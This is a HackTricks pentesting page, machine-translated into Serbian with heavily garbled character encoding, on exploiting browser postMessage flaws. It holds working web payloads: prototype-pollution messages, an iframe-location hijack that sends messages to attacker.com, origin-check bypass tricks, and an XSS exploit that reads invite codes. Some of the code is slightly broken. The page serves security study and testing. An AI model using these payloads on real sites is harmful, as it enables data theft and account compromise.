# PostMessage Vulnerabilities

## Vulnerabilnosti PostMessage

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## PoÅ¡alji **PostMessage**

**PostMessage** koristi sledeÄ‡u funkciju za slanje poruke:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Imajte na umu da **targetOrigin** moÅ¾e biti '\*' ili URL poput _https://company.com._\
U **drugom scenariju**, **poruka moÅ¾e biti poslata samo toj domeni** (Äak i ako je poreklo objekta prozora drugaÄije).\
Ako se koristi **zvezdica**, **poruke mogu biti poslate bilo kojoj domeni**, i biÄ‡e poslate na poreklo objekta Prozora.

### Napad na iframe & zvezdicu u **targetOrigin**

Kao Å¡to je objaÅ¡njeno u [**ovom izveÅ¡taju**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) ako pronaÄ‘ete stranicu koja moÅ¾e biti **iframed** (bez zaÅ¡tite `X-Frame-Header`) i koja Å¡alje osetljivu poruku putem **postMessage** koristeÄ‡i **zvezdicu** (\*), moÅ¾ete **modifikovati** **poreklo** **iframe-a** i **procureti** **osetljivu** poruku na domen koji kontroliÅ¡ete.\
Imajte na umu da ako stranica moÅ¾e biti iframed ali je **targetOrigin** postavljen na URL a ne na zvezdicu, ovaj **tri**k neÄ‡e raditi.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## IskoriÅ¡Ä‡avanje addEventListener

**`addEventListener`** je funkcija koju JS koristi da deklariÅ¡e funkciju koja oÄekuje `postMessages`.\
KoristiÄ‡e se kod sliÄan sledeÄ‡em:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
U ovom sluÄaju, **prva stvar** koju kod radi je **provera porekla**. To je izuzetno **vaÅ¾no**, posebno ako stranica planira da radi **neÅ¡to osetljivo** sa primljenim informacijama (kao Å¡to je promena lozinke). **Ako ne proverava poreklo, napadaÄi mogu naterati Å¾rtve da Å¡alju proizvoljne podatke na ove endpointove** i promeniti lozinke Å¾rtava (u ovom primeru).

### Enumeracija

Da biste **pronaÅ¡li sluÅ¡aoce dogaÄ‘aja** na trenutnoj stranici moÅ¾ete:

* **PretraÅ¾ite** JS kod za `window.addEventListener` i `$(window).on` (_JQuery verzija_)
* **IzvrÅ¡ite** u konzoli alatki za razvoj: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* **Idite na** _Elementi --> SluÅ¡aoci dogaÄ‘aja_ u alatkama za razvoj pregledaÄa

![](<../../.gitbook/assets/image (393).png>)

* Koristite **dodatak za pregledaÄ** poput [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ili [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Ovi dodaci za pregledaÄe Ä‡e **presresti sve poruke** i prikazati ih vama.

### Bypass provere porekla

* Atribut **`event.isTrusted`** smatra se sigurnim jer vraÄ‡a `True` samo za dogaÄ‘aje koji su generisani autentiÄnim korisniÄkim akcijama. Iako je izazovno zaobiÄ‡i ga ako je pravilno implementiran, njegova vaÅ¾nost u sigurnosnim proverama je znaÄajna.
*   KoriÅ¡Ä‡enje **`indexOf()`** za proveru porekla u PostMessage dogaÄ‘ajima moÅ¾e biti podloÅ¾no zaobilaÅ¾enju. Primer koji ilustruje ovu ranjivost je:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
*   Metoda **`search()`** iz `String.prototype.search()` namenjena je regularnim izrazima, a ne stringovima. ProsleÄ‘ivanje bilo Äega osim regexpa dovodi do implicitne konverzije u regex, ÄineÄ‡i metodu potencijalno nesigurnom. To je zato Å¡to u regexu taÄka (.) deluje kao zamenski znak, omoguÄ‡avajuÄ‡i zaobilaÅ¾enje validacije sa specijalno oblikovanim domenima. Na primer:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* Funkcija **`match()`**, sliÄno kao `search()`, obraÄ‘uje regex. Ako je regex nepravilno struktuiran, moÅ¾e biti podloÅ¾an zaobilaÅ¾enju.
*   Funkcija **`escapeHtml`** namenjena je zaÅ¡titi unosa putem izbegavanja karaktera. MeÄ‘utim, ona ne stvara novi izbegnuti objekat veÄ‡ prebrisuje svojstva postojeÄ‡eg objekta. Ovo ponaÅ¡anje moÅ¾e biti iskoriÅ¡Ä‡eno. Posebno, ako se objekat moÅ¾e manipulisati tako da njegovo kontrolisano svojstvo ne prepoznaje `hasOwnProperty`, `escapeHtml` neÄ‡e raditi kako se oÄekuje. To je prikazano u primerima ispod:

*   OÄekivano neuspeÅ¡no:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
*   ZaobilaÅ¾enje izbegavanja:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

U kontekstu ove ranjivosti, objekat `File` je posebno iskoriÅ¡Ä‡iv zbog svog samo za Äitanje svojstva `name`. Ovo svojstvo, kada se koristi u Å¡ablonima, nije dezinfikovano funkcijom `escapeHtml`, Å¡to dovodi do potencijalnih sigurnosnih rizika.
* Svojstvo `document.domain` u JavaScript-u moÅ¾e biti postavljeno skriptom da skrati domen, omoguÄ‡avajuÄ‡i opuÅ¡teniju primenu politike istog porekla unutar istog roditeljskog domena.

### Bypass e.origin == window.origin

Prilikom ugradnje veb stranice unutar **sandboxed iframe** koristeÄ‡i %%%%%%, vaÅ¾no je razumeti da Ä‡e poreklo ifreama biti postavljeno na null. To je posebno vaÅ¾no kada se radi sa **sandbox atributima** i njihovim implikacijama na sigurnost i funkcionalnost.

Specifikacijom **`allow-popups`** u sandbox atributu, svaki popup prozor otvoren iz ifreama nasleÄ‘uje sandbox ograniÄenja svojih roditelja. To znaÄi da osim ako je takoÄ‘e ukljuÄen atribut **`allow-popups-to-escape-sandbox`**, poreklo popup prozora takoÄ‘e je postavljeno na `null`, usklaÄ‘ujuÄ‡i se sa poreklom ifreama.

Kao rezultat toga, kada se otvori popup u ovim uslovima i poruka se poÅ¡alje iz ifreama ka popup prozoru koristeÄ‡i **`postMessage`**, kako poÅ¡iljalac tako i primalac imaju svoja porekla postavljena na `null`. Ova situacija dovodi do scenarija gde **`e.origin == window.origin`** vrednuje kao taÄno (`null == null`), jer i ifream i popup dele istu vrednost porekla `null`.

Za viÅ¡e informacija **proÄitajte**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### ZaobilaÅ¾enje e.source

MoguÄ‡e je proveriti da li je poruka doÅ¡la iz istog prozora u kojem skripta sluÅ¡a (posebno zanimljivo za **Content Scripts iz proÅ¡irenja pregledaÄa** da provere da li je poruka poslata sa iste stranice):
```javascript
// If itâ€™s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
MoÅ¾ete prisiliti **`e.source`** poruke da bude null tako Å¡to kreirate **iframe** koji **Å¡alje** **postMessage** i odmah se **briÅ¡e**.

Za viÅ¡e informacija **proÄitajte:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Bypassovanje X-Frame-Header-a

Da biste izveli ove napade, idealno je da moÅ¾ete **ubaciti ciljnu web stranicu** unutar `iframe`-a. MeÄ‘utim, neki zaglavlja poput `X-Frame-Header` mogu **spreÄiti** takvo **ponaÅ¡anje**.\
U tim scenarijima i dalje moÅ¾ete koristiti manje prikraden napad. MoÅ¾ete otvoriti novi tab ka ranjivoj web aplikaciji i komunicirati s njom:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### KraÄ‘a poruke poslate detetu blokiranjem glavne stranice

Na sledeÄ‡oj stranici moÅ¾ete videti kako biste mogli ukrasti **osetljive podatke poslate putem postmessage** detetu u **iframe-u** blokiranjem **glavne** stranice pre slanja podataka i zloupotrebljavajuÄ‡i **XSS u detetu** da **procure podatke** pre nego Å¡to budu primljeni:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### KraÄ‘a poruke modifikovanjem lokacije iframe-a

Ako moÅ¾ete ugraditi veb stranicu bez X-Frame-Header-a koja sadrÅ¾i drugi iframe, moÅ¾ete **promeniti lokaciju tog detetovog iframe-a**, tako da ako prima **postmessage** poslat koriÅ¡Ä‡enjem **zvezdice**, napadaÄ bi mogao **promeniti** tu iframe **poreklo** na stranicu kojom **kontroliÅ¡e** i **ukrasti** poruku:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage ka Prototype Pollution i/ili XSS

U scenarijima gde su podaci poslati putem `postMessage` izvrÅ¡eni od strane JS-a, moÅ¾ete **ugraditi** **stranicu** i **iskoristiti** **prototype pollution/XSS** slanjem eksploatacije putem `postMessage`.

Par **veoma dobro objaÅ¡njenih XSS-a putem `postMessage`** moÅ¾e se pronaÄ‡i na [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Primer eksploatacije za zloupotrebu **Prototype Pollution a zatim XSS** putem `postMessage` ka `iframe-u`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Za **viÅ¡e informacija**:

* Link ka stranici o [**prototipnom zagaÄ‘enju**](../deserialization/nodejs-proto-prototype-pollution/)
* Link ka stranici o [**XSS**](../xss-cross-site-scripting/)
* Link ka stranici o [**zagaÄ‘enju prototipa na klijentskoj strani do XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Reference

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Za veÅ¾bu: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
